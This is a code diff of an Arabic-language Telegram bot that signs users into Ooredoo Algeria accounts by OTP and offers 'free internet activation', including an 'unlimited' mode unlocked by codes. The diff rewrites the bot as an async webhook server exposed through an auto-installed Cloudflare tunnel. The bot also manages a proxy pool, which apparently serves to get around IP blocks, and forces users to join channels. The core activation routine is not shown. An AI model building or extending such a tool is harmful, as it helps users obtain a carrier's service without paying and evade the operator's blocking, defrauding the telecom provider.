+async def handle_unlimited_code_input(chat_id, code):
+    code = code.strip().upper()
+    if code in UNLIMITED_CODES:
+        with _lock:
+            _unlimited_users.add(chat_id)
+        _save_async()
+        await tg_buttons_async(
+            chat_id,
+            "✅ <b>تم تفعيل وضع بدون قيد!</b>\n\nالآن يمكنك التفعيل بدون أي حدود.",
+            [["🔓 تفعيل بدون قيد ✅"], ["🔙 رجوع للقائمة"]]
+        )
+        return True
+    else:
+        # ❌ message auto-deletes after 4 seconds — never stays on screen
+        await tg_send_then_delete(
+            chat_id,
+            "❌ الكود غير صحيح.",
+            delay=4.0
+        )
+        return False
 
 # ════════════════════════════════════════════════════════════════════════════
 # ADMIN HANDLERS
 # ════════════════════════════════════════════════════════════════════════════
-def handle_admin(chat_id, text):
+async def handle_admin(chat_id, text):
     global _maintenance
     if chat_id not in ADMIN_IDS:
         return False
 
-    if text == "/admin" or text == "⚙️ لوحة التحكم":
-        admin_menu(chat_id)
+    if text in ("/admin", "⚙️ لوحة التحكم"):
+        await admin_menu(chat_id)
         return True
 
     if text.startswith("🔢 حد التفعيلات لكل رقم:"):
         oo_set_session(chat_id, {"state": "admin_set_limit"})
-        tg_send(
+        await tg_send_async_fn(
             chat_id,
             f"📝 أرسل العدد الجديد للتفعيلات المسموح بها لكل رقم (الحالي: {_max_activations}):"
         )
         return True
 
     if text == "⚡ حالة البوت: يعمل 🟢":
-        tg_send(chat_id, "✅ البوت يعمل بشكل طبيعي.")
+        await tg_send_async_fn(chat_id, "✅ البوت يعمل بشكل طبيعي.")
         return True
 
     if text.startswith("🔧 الصيانة"):
         _maintenance = not _maintenance
         _save_async()
-        admin_menu(chat_id)
+        await admin_menu(chat_id)
         return True
 
     if text.startswith("📢 إدارة القنوات"):
         kb = [[f"❌ حذف {c}"] for c in _forced_channels]
         kb.append(["➕ إضافة قناة", "🔙 رجوع للوحة"])
         ch_list = "\n".join(f"- {c}" for c in _forced_channels) if _forced_channels else "لا توجد"
-        tg_buttons(chat_id, f"📢 <b>القنوات المضافة:</b>\n{ch_list}", kb)
+        await tg_buttons_async(chat_id, f"📢 <b>القنوات المضافة:</b>\n{ch_list}", kb)
         return True
 
     if text == "➕ إضافة قناة":
         oo_set_session(chat_id, {"state": "admin_add_channel"})
-        tg_send(chat_id, "📝 أرسل يوزرنيم القناة (مثال: @mychannel):")
+        await tg_send_async_fn(chat_id, "📝 أرسل يوزرنيم القناة (مثال: @mychannel):")
         return True
 
     if text.startswith("❌ حذف "):
@@ -935,17 +1063,17 @@ def handle_admin(chat_id, text):
             _forced_channels.remove(ch)
             _save_async()
             invalidate_sub_cache()
-        tg_send(chat_id, f"✅ تم حذف {ch}")
-        admin_menu(chat_id)
+        await tg_send_async_fn(chat_id, f"✅ تم حذف {ch}")
+        await admin_menu(chat_id)
         return True
 
     if text == "📣 إذاعة عامة":
         oo_set_session(chat_id, {"state": "admin_broadcast"})
-        tg_send(chat_id, "📝 أرسل الرسالة التي تريد إذاعتها:")
+        await tg_send_async_fn(chat_id, "📝 أرسل الرسالة التي تريد إذاعتها:")
         return True
 
     if text == "📊 إحصائيات":
-        tg_send(
+        await tg_send_async_fn(
             chat_id,
             f"📊 <b>إحصائيات البوت</b>\n\n"
             f"👥 المستخدمون: {_bot_stats.get('users', 0)}\n"
@@ -956,20 +1084,19 @@ def handle_admin(chat_id, text):
         )
         return True
 
-    # Proxy
     if text.startswith("🌐 البروكسي:") or text == "⚙️ إدارة البروكسي":
-        proxy_menu(chat_id)
+        await proxy_menu(chat_id)
         return True
 
     if text.startswith("🔛 تشغيل/إيقاف"):
         _proxy_mgr.toggle()
         _save_async()
-        proxy_menu(chat_id)
+        await proxy_menu(chat_id)
         return True
 
     if text == "➕ إضافة بروكسي":
         oo_set_session(chat_id, {"state": "admin_add_proxy"})
-        tg_send(
+        await tg_send_async_fn(
             chat_id,
             "📝 أرسل البروكسي/البروكسيات (واحد في كل سطر).\n"
             "الصيغ المدعومة:\n"
@@ -983,35 +1110,35 @@ def handle_admin(chat_id, text):
     if text == "📋 عرض البروكسيات":
         items = _proxy_mgr.list_all()
         if not items:
-            tg_send(chat_id, "📭 لا توجد بروكسيات مضافة.")
+            await tg_send_async_fn(chat_id, "📭 لا توجد بروكسيات مضافة.")
         else:
             body = "\n".join(f"{i+1}. <code>{p['url']}</code> ({p['type']})"
                              for i, p in enumerate(items[:50]))
             if len(items) > 50:
                 body += f"\n... و{len(items)-50} أخرى"
-            tg_send(chat_id, f"🌐 <b>البروكسيات ({len(items)}):</b>\n\n{body}")
-        proxy_menu(chat_id)
+            await tg_send_async_fn(chat_id, f"🌐 <b>البروكسيات ({len(items)}):</b>\n\n{body}")
+        await proxy_menu(chat_id)
         return True
 
     if text == "🗑️ حذف بروكسي":
         oo_set_session(chat_id, {"state": "admin_del_proxy"})
-        tg_send(chat_id, "📝 أرسل البروكسي لحذفه (كما هو مكتوب):")
+        await tg_send_async_fn(chat_id, "📝 أرسل البروكسي لحذفه (كما هو مكتوب):")
         return True
 
     if text == "🧹 حذف الكل":
         _proxy_mgr.clear()
         _save_async()
-        tg_send(chat_id, "✅ تم حذف جميع البروكسيات.")
-        proxy_menu(chat_id)
+        await tg_send_async_fn(chat_id, "✅ تم حذف جميع البروكسيات.")
+        await proxy_menu(chat_id)
         return True
 
     if text == "🔙 رجوع للوحة":
-        admin_menu(chat_id)
+        await admin_menu(chat_id)
         return True
 
     return False
 
-def handle_admin_state(chat_id, text):
+async def handle_admin_state(chat_id, text):
     global _max_activations
     sess = oo_get_session(chat_id)
     state = sess.get("state", "")
@@ -1019,17 +1146,17 @@ def handle_admin_state(chat_id, text):
     if state == "admin_set_limit":
         raw = text.strip()
         if not raw.isdigit():
-            tg_send(chat_id, "❌ الرجاء إدخال رقم صحيح.")
+            await tg_send_async_fn(chat_id, "❌ الرجاء إدخال رقم صحيح.")
             return True
         new_limit = int(raw)
         if new_limit < 1:
-            tg_send(chat_id, "❌ يجب أن يكون العدد 1 على الأقل.")
+            await tg_send_async_fn(chat_id, "❌ يجب أن يكون العدد 1 على الأقل.")
             return True
         _max_activations = new_limit
         _save_async()
-        tg_send(chat_id, f"✅ تم تغيير الحد الأقصى للتفعيلات إلى: {_max_activations} لكل رقم.")
+        await tg_send_async_fn(chat_id, f"✅ تم تغيير الحد الأقصى للتفعيلات إلى: {_max_activations} لكل رقم.")
         oo_clear_session(chat_id)
-        admin_menu(chat_id)
+        await admin_menu(chat_id)
         return True
 
     if state == "admin_add_channel":
@@ -1040,29 +1167,28 @@ def handle_admin_state(chat_id, text):
             _forced_channels.append(ch)
             _save_async()
             invalidate_sub_cache()
-            tg_send(chat_id, f"✅ تم إضافة القناة {ch}")
+            await tg_send_async_fn(chat_id, f"✅ تم إضافة القناة {ch}")
         else:
-            tg_send(chat_id, "⚠️ القناة موجودة مسبقاً.")
+            await tg_send_async_fn(chat_id, "⚠️ القناة موجودة مسبقاً.")
         oo_clear_session(chat_id)
-        admin_menu(chat_id)
+        await admin_menu(chat_id)
         return True
 
     if state == "admin_broadcast":
-        cnt = 0
         uids = list(_users.keys())
-        def _bc():
-            nonlocal cnt
+        oo_clear_session(chat_id)
+        async def _bc():
+            cnt = 0
             for uid in uids:
                 try:
-                    tg_send(uid, text)
+                    await tg_send_async_fn(uid, text)
                     cnt += 1
-                    time.sleep(0.05)
+                    await asyncio.sleep(0.05)
                 except:
                     pass
-            tg_send(chat_id, f"✅ تم إرسال الرسالة لـ {cnt} مستخدم.")
-            admin_menu(chat_id)
-        oo_clear_session(chat_id)
-        threading.Thread(target=_bc, daemon=True).start()
+            await tg_send_async_fn(chat_id, f"✅ تم إرسال الرسالة لـ {cnt} مستخدم.")
+            await admin_menu(chat_id)
+        asyncio.create_task(_bc())
         return True
 
     if state == "admin_add_proxy":
@@ -1073,15 +1199,12 @@ def handle_admin_state(chat_id, text):
             r = _proxy_mgr.add(l)
             if r is True:
                 added += 1
-            elif r is False:
-                pass  # duplicate
-            else:
+            elif r is None:
                 failed += 1
         _save_async()
-        tg_send(chat_id, f"✅ تم إضافة {added} بروكسي (فشل: {failed}).\n"
-                          f"الإجمالي: {_proxy_mgr.count}")
+        await tg_send_async_fn(chat_id, f"✅ تم إضافة {added} بروكسي (فشل: {failed}).\nالإجمالي: {_proxy_mgr.count}")
         oo_clear_session(chat_id)
-        proxy_menu(chat_id)
+        await proxy_menu(chat_id)
         return True
 
     if state == "admin_del_proxy":
@@ -1089,61 +1212,37 @@ def handle_admin_state(chat_id, text):
         ok = _proxy_mgr.remove(raw)
         if ok:
             _save_async()
-            tg_send(chat_id, "✅ تم حذف البروكسي.")
+            await tg_send_async_fn(chat_id, "✅ تم حذف البروكسي.")
         else:
-            tg_send(chat_id, "❌ لم يتم العثور على البروكسي.")
+            await tg_send_async_fn(chat_id, "❌ لم يتم العثور على البروكسي.")
         oo_clear_session(chat_id)
-        proxy_menu(chat_id)
+        await proxy_menu(chat_id)
         return True
 
     return False
 
 # ════════════════════════════════════════════════════════════════════════════
-# UNLIMITED CODE HANDLER
-# ════════════════════════════════════════════════════════════════════════════
-def handle_unlimited_code_input(chat_id, code):
-    code = code.strip().upper()
-    if code in UNLIMITED_CODES:
-        with _lock:
-            _unlimited_users.add(chat_id)
-        _save_async()
-        tg_buttons(
-            chat_id,
-            "✅ <b>تم تفعيل وضع بدون قيد!</b>\n\n"
-            "الآن يمكنك التفعيل بدون أي حدود لكل الأرقام.",
-            [["🔓 تفعيل بدون قيد"], ["🔙 رجوع للقائمة"]]
-        )
-        return True
-    else:
-        tg_buttons(
-            chat_id,
-            "❌ الكود غير صحيح.",
-            [["🔓 تفعيل بدون قيد"], ["🔙 رجوع للقائمة"]]
-        )
-        return False
-
-# ════════════════════════════════════════════════════════════════════════════
 # MAIN HANDLER
 # ════════════════════════════════════════════════════════════════════════════
-def handle(chat_id, text):
+async def handle(chat_id, text):
     try:
         text = text.strip()
 
         # Admin first
         if chat_id in ADMIN_IDS:
-            if handle_admin(chat_id, text):
+            if await handle_admin(chat_id, text):
                 return
-            if handle_admin_state(chat_id, text):
+            if await handle_admin_state(chat_id, text):
                 return
 
         # Maintenance
         if _maintenance and chat_id not in ADMIN_IDS:
-            tg_send(chat_id, "🔧 البوت في وضع الصيانة حالياً. عد لاحقاً.")
+            await tg_send_async_fn(chat_id, "🔧 البوت في وضع الصيانة حالياً. عد لاحقاً.")
             return
 
         # Force subscribe
-        if not check_sub(chat_id):
-            send_join_msg(chat_id)
+        if not await check_sub(chat_id):
+            await send_join_msg(chat_id)
             return
 
         sess = oo_get_session(chat_id)
@@ -1153,85 +1252,81 @@ def handle(chat_id, text):
         # /start
         if text == "/start":
             if user and user.get("access_token"):
-                oo_menu(chat_id, user)
+                await oo_menu(chat_id, user)
                 return
             oo_set_session(chat_id, {"state": "awaiting_phone_input"})
-            tg_send(chat_id, "👋 مرحباً!\nأرسل رقم أوريدو الخاص بك (مثال: 05XXXXXXXX) 📱")
+            await tg_send_async_fn(chat_id, "👋 مرحباً!\nأرسل رقم أوريدو الخاص بك (مثال: 05XXXXXXXX) 📱")
             return
 
-        # Awaiting unlimited code
+        # Awaiting unlimited code — ❌ auto-deletes, never persists
         if state == "awaiting_unlimited_code":
-            ok = handle_unlimited_code_input(chat_id, text)
+            ok = await handle_unlimited_code_input(chat_id, text)
             if ok:
                 oo_clear_session(chat_id)
-                oo_menu(chat_id)
-            else:
-                # stay in same state to retry
-                pass
+                await oo_menu(chat_id)
+            # on failure: session stays, error msg auto-deleted after 4s
             return
 
         # Awaiting phone
         if state == "awaiting_phone_input":
             dg = "".join(c for c in text if c.isdigit())
             if not re.match(r'^05\d{8}$', dg):
-                tg_send(chat_id, "❌ أدخل رقم أوريدو صحيح (مثال: 0550123456) 📱")
+                await tg_send_async_fn(chat_id, "❌ أدخل رقم أوريدو صحيح (مثال: 0550123456) 📱")
                 return
             msisdn = "213" + dg[1:]
             oo_set_session(chat_id, {"state": "awaiting_otp", "msisdn": msisdn})
-            tg_buttons(
+            await tg_buttons_async(
                 chat_id,
                 "✅ تم استلام رقمك!\n\n📩 أرسل رمز OTP اللي وصلك في SMS:",
                 [["🔄 تجديد الرمز", "📱 تغيير الرقم"]]
             )
-
-            def _bg_send():
+            async def _bg_send():
                 try:
                     dev = oo_get_device(chat_id)
-                    res = oo_send_otp(msisdn, dev)
+                    res = await oo_send_otp(msisdn, dev)
                     if not res:
-                        tg_send_async(chat_id, "⚠️ تعذر إرسال OTP. جرّب 'تجديد الرمز'.")
+                        await tg_send_async_fn(chat_id, "⚠️ تعذر إرسال OTP. جرّب 'تجديد الرمز'.")
                 except Exception as e:
                     logger.error(f"bg_send: {e}")
-            threading.Thread(target=_bg_send, daemon=True).start()
+            asyncio.create_task(_bg_send())
             return
 
         # Awaiting OTP
         if state == "awaiting_otp":
             if text == "🔄 تجديد الرمز":
                 msisdn = sess.get("msisdn")
-                tg_buttons(chat_id, "⏳ جاري إرسال رمز جديد...",
-                           [["🔄 تجديد الرمز", "📱 تغيير الرقم"]])
-
-                def _bg_resend():
+                await tg_buttons_async(chat_id, "⏳ جاري إرسال رمز جديد...",
+                                       [["🔄 تجديد الرمز", "📱 تغيير الرقم"]])
+                async def _bg_resend():
                     try:
                         dev = oo_get_device(chat_id)
-                        oo_send_otp(msisdn, dev)
+                        await oo_send_otp(msisdn, dev)
                     except Exception as e:
                         logger.error(f"bg_resend: {e}")
-                threading.Thread(target=_bg_resend, daemon=True).start()
+                asyncio.create_task(_bg_resend())
                 return
 
             if text == "📱 تغيير الرقم":
                 oo_clear_session(chat_id)
                 oo_set_session(chat_id, {"state": "awaiting_phone_input"})
-                tg_send(chat_id, "📱 أدخل رقم أوريدو الجديد (05XXXXXXXX):")
+                await tg_send_async_fn(chat_id, "📱 أدخل رقم أوريدو الجديد (05XXXXXXXX):")
                 return
 
             if not text.isdigit() or len(text) != 6:
-                tg_buttons(chat_id, "❌ رمز OTP يجب أن يكون 6 أرقام",
-                           [["🔄 تجديد الرمز", "📱 تغيير الرقم"]])
+                await tg_buttons_async(chat_id, "❌ رمز OTP يجب أن يكون 6 أرقام",
+                                       [["🔄 تجديد الرمز", "📱 تغيير الرقم"]])
                 return
 
             msisdn = sess.get("msisdn")
             dev = oo_get_device(chat_id)
-            res = oo_verify_otp(msisdn, text, dev)
+            res = await oo_verify_otp(msisdn, text, dev)
 
             if res == "wrong_otp":
-                tg_buttons(chat_id, "❌ الرمز خاطئ، جرب مجدداً",
-                           [["🔄 تجديد الرمز", "📱 تغيير الرقم"]])
+                await tg_buttons_async(chat_id, "❌ الرمز خاطئ، جرب مجدداً",
+                                       [["🔄 تجديد الرمز", "📱 تغيير الرقم"]])
                 return
             if not res:
-                tg_send(chat_id, "❌ سيرفر غير متاح أو IP محظور.")
+                await tg_send_async_fn(chat_id, "❌ سيرفر غير متاح أو IP محظور.")
                 oo_clear_session(chat_id)
                 return
 
@@ -1239,14 +1334,14 @@ def handle(chat_id, text):
             nu.update(res)
             oo_save_user(chat_id, nu)
             oo_clear_session(chat_id)
-            tg_send(chat_id, "🎉 تم تسجيل الدخول بنجاح!")
-            oo_menu(chat_id, oo_get_user(chat_id))
+            await tg_send_async_fn(chat_id, "🎉 تم تسجيل الدخول بنجاح!")
+            await oo_menu(chat_id, oo_get_user(chat_id))
             return
 
         # No user
         if not user or not user.get("access_token"):
             oo_set_session(chat_id, {"state": "awaiting_phone_input"})
-            tg_send(chat_id, "📱 أرسل رقم أوريدو (05XXXXXXXX):")
+            await tg_send_async_fn(chat_id, "📱 أرسل رقم أوريدو (05XXXXXXXX):")
             return
 
         # New number
@@ -1254,26 +1349,25 @@ def handle(chat_id, text):
             oo_delete_user(chat_id)
             oo_clear_session(chat_id)
             oo_set_session(chat_id, {"state": "awaiting_phone_input"})
-            tg_send(chat_id, "📱 أرسل رقم أوريدو الجديد (05XXXXXXXX):")
+            await tg_send_async_fn(chat_id, "📱 أرسل رقم أوريدو الجديد (05XXXXXXXX):")
             return
 
-        # Unlimited activation (code-protected)
+        # Unlimited activation
         if text.startswith("🔓 تفعيل بدون قيد"):
             if chat_id in _unlimited_users or chat_id in ADMIN_IDS:
-                oo_do_open_box(chat_id, user, unlimited=True)
+                await oo_do_open_box(chat_id, user, unlimited=True)
                 return
             else:
                 oo_set_session(chat_id, {"state": "awaiting_unlimited_code"})
-                tg_send(
+                await tg_send_async_fn(
                     chat_id,
-                    "🔑 <b>أدخل كود التفعيل بدون قيد:</b>\n\n"
-                    "أرسل الكود الخاص بك لتفعيل الميزة."
+                    "🔑 <b>أدخل كود التفعيل بدون قيد:</b>\n\nأرسل الكود الخاص بك."
                 )
                 return
 
-        # Activate (normal)
+        # Normal activation
         if text == "🌐 تفعيل انترنت مجاني":
-            oo_do_open_box(chat_id, user, unlimited=False)
+            await oo_do_open_box(chat_id, user, unlimited=False)
             return
 
         # Balance
@@ -1284,151 +1378,245 @@ def handle(chat_id, text):
                 "tok_instance_id": user.get("tok_instance_id"),
                 "tok_plat_sig": user.get("tok_plat_sig"),
             })
-            r = oo_http("GET",
+            r = await oo_http_async("GET",
                         f"{OOREDOO_BFF}/subscriptions/getAccountInfo?msisdn={m}", h)
             if r and r.get("code") == 200:
                 bal = r["json"].get("accountBalance", "0")
-                tg_buttons(chat_id, f"💸 الرصيد : {bal} دج", [["🔙 رجوع للقائمة"]])
+                await tg_buttons_async(chat_id, f"💸 الرصيد : {bal} دج", [["🔙 رجوع للقائمة"]])
             else:
-                tg_buttons(chat_id, "❌ تعذر الجلب", [["🔙 رجوع للقائمة"]])
+                await tg_buttons_async(chat_id, "❌ تعذر الجلب", [["🔙 رجوع للقائمة"]])
             return
 
         # Logout
         if text == "🚪 خروج":
             oo_delete_user(chat_id)
             oo_clear_session(chat_id)
-            tg_send(chat_id, "✅ تم تسجيل الخروج.\n\nأرسل /start للبدء من جديد.")
+            await tg_send_async_fn(chat_id, "✅ تم تسجيل الخروج.\n\nأرسل /start للبدء من جديد.")
             return
 
         if text == "🔙 رجوع للقائمة":
-            oo_menu(chat_id, user)
+            await oo_menu(chat_id, user)
             return
 
-        # Default
-        oo_menu(chat_id, user)
+        await oo_menu(chat_id, user)
 
     except Exception as e:
         logger.exception(f"handle: {e}")
         try:
-            tg_send(chat_id, "⚠️ حدث خطأ، حاول مجدداً.")
+            await tg_send_async_fn(chat_id, "⚠️ حدث خطأ، حاول مجدداً.")
         except:
             pass
 
 # ════════════════════════════════════════════════════════════════════════════
-# POLLING
+# WEBHOOK SERVER (aiohttp)
 # ════════════════════════════════════════════════════════════════════════════
-# Thread pool for handling messages — allows many concurrent user requests
-_handler_pool = ThreadPoolExecutor(max_workers=64, thread_name_prefix="handler")
+_update_semaphore: asyncio.Semaphore = None  # initialized in main
 
-def get_updates(offset=None):
-    params = {
-        "timeout": 20,
-        "allowed_updates": json.dumps(["message", "callback_query"]),
-    }
-    if offset:
-        params["offset"] = offset
+async def process_update(upd: dict):
+    """Process one Telegram update — enforces concurrency limit per user."""
     try:
-        r = _tg_session.get(f"{TELEGRAM_API}/getUpdates",
-                            params=params, timeout=(5, 25))
-        return r.json()
-    except:
+        # Callback query
+        cb = upd.get("callback_query")
+        if cb:
+            cb_id = cb.get("id")
+            cb_msg = cb.get("message", {}) or {}
+            chat_id = cb_msg.get("chat", {}).get("id")
+            data_cb = cb.get("data")
+
+            if data_cb == "check_sub" and chat_id:
+                invalidate_sub_cache(chat_id)
+                if await check_sub(chat_id):
+                    await tg_request_async("answerCallbackQuery",
+                                           callback_query_id=cb_id,
+                                           text="✅ تم التحقق من الاشتراك!")
+                    msg_id = cb_msg.get("message_id")
+                    if msg_id:
+                        await tg_delete_msg(chat_id, msg_id)
+                    asyncio.create_task(handle(chat_id, "/start"))
+                else:
+                    await tg_request_async("answerCallbackQuery",
+                                           callback_query_id=cb_id,
+                                           text="❌ مازلت ما شتركتش في جميع القنوات!",
+                                           show_alert=True)
+                    await send_join_msg(chat_id)
+            else:
+                await tg_request_async("answerCallbackQuery",
+                                       callback_query_id=cb_id)
+            return
+
+        # Message
+        msg = upd.get("message")
+        if not msg:
+            return
+        chat_id = msg.get("chat", {}).get("id")
+        text = msg.get("text", "").strip()
+        if not chat_id or not text:
+            return
+
+        # Save username/firstname
+        from_user = msg.get("from", {})
+        if from_user:
+            upd_user = {}
+            if from_user.get("username"):
+                upd_user["username"] = from_user["username"]
+            if from_user.get("first_name"):
+                upd_user["first_name"] = from_user["first_name"]
+            if upd_user:
+                u = oo_get_user(chat_id) or {}
+                changed = any(u.get(k) != v for k, v in upd_user.items())
+                if changed or not u:
+                    oo_save_user(chat_id, upd_user)
+
+        # High-concurrency: fire and forget, semaphore limits simultaneous handlers
+        async def _run_with_sem():
+            async with _update_semaphore:
+                await handle(chat_id, text)
+        asyncio.create_task(_run_with_sem())
+
+    except Exception as e:
+        logger.exception(f"process_update: {e}")
+
+async def webhook_handler(request: web.Request) -> web.Response:
+    """aiohttp webhook endpoint — receives and dispatches updates immediately."""
+    try:
+        upd = await request.json()
+        asyncio.create_task(process_update(upd))
+        return web.Response(text="OK")
+    except Exception as e:
+        logger.warning(f"webhook_handler: {e}")
+        return web.Response(text="OK")  # always 200 to Telegram
+
+async def health_handler(request: web.Request) -> web.Response:
+    return web.json_response({"status": "ok", "users": len(_users), "activations": _bot_stats.get("activations", 0)})
+
+# ════════════════════════════════════════════════════════════════════════════
+# CLOUDFLARE TUNNEL (cloudflared — free, no account needed)
+# ════════════════════════════════════════════════════════════════════════════
+_cloudflare_url = None
+
+def _install_cloudflared():
+    """Auto-install cloudflared if not present."""
+    if os.path.exists("/usr/local/bin/cloudflared"):
+        return True
+    logger.info("📥 تثبيت cloudflared...")
+    try:
+        import platform
+        arch = platform.machine()
+        if "x86_64" in arch or "amd64" in arch:
+            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+        elif "aarch64" in arch or "arm64" in arch:
+            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+        else:
+            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+
+        import urllib.request
+        urllib.request.urlretrieve(url, "/usr/local/bin/cloudflared")
+        os.chmod("/usr/local/bin/cloudflared", 0o755)
+        logger.info("✅ cloudflared مثبت.")
+        return True
+    except Exception as e:
+        logger.error(f"cloudflared install failed: {e}")
+        return False
+
+def _start_cloudflared(port: int):
+    """Start cloudflared tunnel in background, parse the public URL."""
+    global _cloudflare_url
+    try:
+        proc = subprocess.Popen(
+            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}",
+             "--no-autoupdate"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+        )
+        import re as _re
+        url_pattern = _re.compile(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com')
+        for line in proc.stdout:
+            line = line.strip()
+            m = url_pattern.search(line)
+            if m:
+                _cloudflare_url = m.group(0)
+                logger.info(f"🌐 Cloudflare URL: {_cloudflare_url}")
+                break
+        return proc
+    except FileNotFoundError:
+        logger.error("cloudflared not found. يرجى تثبيته يدوياً.")
         return None
 
-def polling_loop():
+async def _set_webhook(public_url: str):
+    """Register webhook with Telegram."""
+    webhook_url = public_url + WEBHOOK_PATH
+    result = await tg_request_async(
+        "setWebhook",
+        url=webhook_url,
+        allowed_updates=["message", "callback_query"],
+        drop_pending_updates=True,
+        max_connections=100,
+    )
+    if result and result.get("ok"):
+        logger.info(f"✅ Webhook set: {webhook_url}")
+    else:
+        logger.error(f"❌ Webhook failed: {result}")
+
+# ════════════════════════════════════════════════════════════════════════════
+# ENTRY POINT
+# ════════════════════════════════════════════════════════════════════════════
+async def main():
+    global _update_semaphore
+
+    if not TELEGRAM_BOT_TOKEN:
+        logger.error("❌ TELEGRAM_BOT_TOKEN غير معرّف.")
+        sys.exit(1)
+
+    # Semaphore: max 300 concurrent handlers (protects event loop under load)
+    _update_semaphore = asyncio.Semaphore(300)
+
+    _load_from_disk()
+    await _init_aio_sessions()
+
+    logger.info("🚀 Bot Starting (Webhook Mode)...")
+    logger.info(f"👑 Admins: {ADMIN_IDS}")
+    logger.info(f"📢 Forced channels: {_forced_channels}")
+    logger.info(f"🔓 Unlimited codes: {len(UNLIMITED_CODES)}")
+    logger.info(f"🌐 Proxy: {'ON' if _proxy_mgr.enabled else 'OFF'} | Count: {_proxy_mgr.count}")
+
+    # Start cloudflared in background thread (blocking URL parse)
+    _install_cloudflared()
+    loop = asyncio.get_event_loop()
+    cf_proc = await loop.run_in_executor(None, _start_cloudflared, WEBHOOK_PORT)
+
+    if _cloudflare_url:
+        await _set_webhook(_cloudflare_url)
+        logger.info(f"✅ Webhook active at: {_cloudflare_url}{WEBHOOK_PATH}")
+    else:
+        logger.warning("⚠️ Cloudflare URL not found. Set webhook manually.")
+
+    # Build aiohttp app
+    app = web.Application()
+    app.router.add_post(WEBHOOK_PATH, webhook_handler)
+    app.router.add_get("/health", health_handler)
+
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, "0.0.0.0", WEBHOOK_PORT)
+    await site.start()
+
+    logger.info(f"🔊 Webhook server listening on port {WEBHOOK_PORT}")
+
     try:
-        _tg_session.get(f"{TELEGRAM_API}/deleteWebhook",
-                        params={"drop_pending_updates": "true"}, timeout=5)
-    except:
-        pass
+        # Keep alive forever
+        while True:
+            await asyncio.sleep(3600)
+    except (KeyboardInterrupt, asyncio.CancelledError):
+        logger.info("Stopping...")
+    finally:
+        await runner.cleanup()
+        if _aio_session:
+            await _aio_session.close()
+        if _aio_tg_session:
+            await _aio_tg_session.close()
+        if cf_proc:
+            cf_proc.terminate()
 
-    offset = None
-    while True:
-        try:
-            data = get_updates(offset)
-            if not data or not data.get("ok"):
-                time.sleep(1)
-                continue
-
-            for upd in data.get("result", []):
-                offset = upd["update_id"] + 1
-
-                # Callback
-                cb = upd.get("callback_query")
-                if cb:
-                    cb_id = cb.get("id")
-                    cb_msg = cb.get("message", {}) or {}
-                    chat_id = cb_msg.get("chat", {}).get("id")
-                    data_cb = cb.get("data")
-
-                    if data_cb == "check_sub" and chat_id:
-                        invalidate_sub_cache(chat_id)
-                        if check_sub(chat_id):
-                            tg_request("answerCallbackQuery",
-                                       callback_query_id=cb_id,
-                                       text="✅ تم التحقق من الاشتراك!")
-                            msg_id = cb_msg.get("message_id")
-                            if msg_id:
-                                try:
-                                    tg_request("deleteMessage",
-                                               chat_id=chat_id, message_id=msg_id)
-                                except:
-                                    pass
-                            _handler_pool.submit(handle, chat_id, "/start")
-                        else:
-                            tg_request("answerCallbackQuery",
-                                       callback_query_id=cb_id,
-                                       text="❌ مازلت ما شتركتش في جميع القنوات!",
-                                       show_alert=True)
-                            send_join_msg(chat_id)
-                    else:
-                        try:
-                            tg_request("answerCallbackQuery",
-                                       callback_query_id=cb_id)
-                        except:
-                            pass
-                    continue
-
-                # Message
-                msg = upd.get("message")
-                if not msg:
-                    continue
-                chat_id = msg.get("chat", {}).get("id")
-                text = msg.get("text", "").strip()
-                if chat_id and text:
-                    # Record username/firstname in background (non-blocking)
-                    from_user = msg.get("from", {})
-                    if from_user:
-                        upd_user = {}
-                        if from_user.get("username"):
-                            upd_user["username"] = from_user["username"]
-                        if from_user.get("first_name"):
-                            upd_user["first_name"] = from_user["first_name"]
-                        if upd_user:
-                            u = oo_get_user(chat_id) or {}
-                            changed = any(u.get(k) != v for k, v in upd_user.items())
-                            if changed or not u:
-                                oo_save_user(chat_id, upd_user)
-                    _handler_pool.submit(handle, chat_id, text)
-
-        except Exception as e:
-            logger.exception(f"polling: {e}")
-            time.sleep(1)
-
-# ════════════════════════════════════════════════════════════════════════════
-# ENTRY
-# ════════════════════════════════════════════════════════════════════════════
 if __name__ == "__main__":
-    try:
-        if not TELEGRAM_BOT_TOKEN:
-            logger.error("❌ TELEGRAM_BOT_TOKEN غير معرّف.")
-            sys.exit(1)
-        _init_session_pool()
-        _load_from_disk()
-        logger.info("🚀 Bot Started...")
-        logger.info(f"👑 Admins: {ADMIN_IDS}")
-        logger.info(f"📢 Forced channels: {_forced_channels}")
-        logger.info(f"🔓 Unlimited codes loaded: {len(UNLIMITED_CODES)}")
-        logger.info(f"🌐 Proxy: {'ON' if _proxy_mgr.enabled else 'OFF'} | Count: {_proxy_mgr.count}")
-        polling_loop()
-    except KeyboardInterrupt:
-        logger.info("Stopped")
+    asyncio.run(main())
